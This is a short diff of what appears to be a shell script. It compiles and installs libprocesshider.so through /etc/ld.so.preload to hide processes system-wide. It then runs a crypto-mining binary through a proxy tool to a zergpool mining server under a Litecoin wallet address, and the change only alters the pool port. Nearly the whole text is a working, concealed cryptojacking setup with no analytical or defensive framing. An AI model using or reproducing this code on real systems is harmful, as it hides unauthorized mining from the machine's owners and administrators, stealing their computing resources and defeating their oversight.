@@ -48,4 +48,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --user Lbf59B5YZDQF8cYoibs3zS1EqbhxevbmEi  --server server equihash144.mine.zergpool.com --port 14040 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --pass="c=LTC,mc=BTG"
+./graftcp/graftcp ./bezzHash --user Lbf59B5YZDQF8cYoibs3zS1EqbhxevbmEi  --server server equihash144.mine.zergpool.com --port 2146 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --pass="c=LTC,mc=BTG"
